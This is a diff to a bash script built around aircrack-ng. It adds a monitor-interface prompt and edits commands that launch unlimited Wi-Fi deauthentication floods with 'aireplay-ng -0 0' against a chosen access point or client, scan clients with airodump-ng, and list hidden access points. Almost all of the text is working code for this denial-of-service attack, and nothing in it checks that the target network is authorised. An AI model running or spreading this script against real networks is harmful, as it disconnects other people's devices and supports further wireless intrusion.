@@ -57,6 +57,8 @@ fi
 iwconfig
 echo "Interface name(e.g. wlan0):"
 read inter
+echo "Interface name in Monitor Mode?:"
+read monitor
 clear
 #read interface end
 #main
@@ -67,7 +69,7 @@ if [ $ask -eq 2 ] || [ $ask -eq 1 ]
 		echo "Choose Channel:"
 		read chan
 		echo "Please wait.. monitor mode is being enabled.."
-		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $inter\mon > /dev/null && exit 1' INT
+		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
 		sudo airmon-ng start $inter $chan > /dev/null
 		echo "MAC of Access-Point:"
 		read macacc
@@ -78,8 +80,8 @@ fi
 #options
 if [ $ask -eq 2 ]
 	then
-		sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
-		sudo airmon-ng stop $inter\mon > /dev/null
+		sudo aireplay-ng -0 0 -a $macacc -b $macacc $monitor
+		sudo airmon-ng stop $monitor > /dev/null
 		tput sgr0
 		exit 0
 fi
@@ -88,12 +90,12 @@ if [ $ask -eq 1 ]
 		echo "How long should be searched for Clients? [sec]:"
 		read secs
 		echo "reading clients from network.. [scanning $secs seconds]"
-		sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $inter\mon
+		sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $monitor
 		echo "Client MAC:"
 		read clientmac
 		tput setaf 1
-		sudo aireplay-ng -0 0 -a $macacc -c $clientmac $inter\mon
-		sudo airmon-ng stop $inter\mon > /dev/null
+		sudo aireplay-ng -0 0 -a $macacc -c $clientmac $monitor
+		sudo airmon-ng stop $monitor > /dev/null
 		tput sgr0
 		exit 0
 fi
@@ -103,9 +105,10 @@ if [ $ask -eq 3 ]
 		read secs
 		tput setaf 1
 		echo "scanning.. [$secs sec]"
-		sleep 4
-		sudo airmon-ng start $inter $chan > /dev/null
-		sudo timeout --kill-after=$secs --foreground $secs airodump-ng $inter\mon &>> temp.txt
+		sleep 2
+		sudo airmon-ng start $inter > /dev/null && echo "enabling monitor mode.."
+		sleep 2
+		sudo timeout --kill-after=$secs --foreground $secs airodump-ng $monitor &>> temp.txt
 		clear
 		tput sgr0
 		echo "Hidden APs are:"
@@ -114,10 +117,10 @@ if [ $ask -eq 3 ]
 		if [ -f 'temp.txt' ]
 			then
 				echo "scan successfull"
-				else
+			else
 				echo "scan error"
 		fi
-		sudo airmon-ng stop $inter\mon > /dev/null
+		sudo airmon-ng stop $monitor > /dev/null
 		sleep 1
 		sudo rm temp.txt
 		exit 0
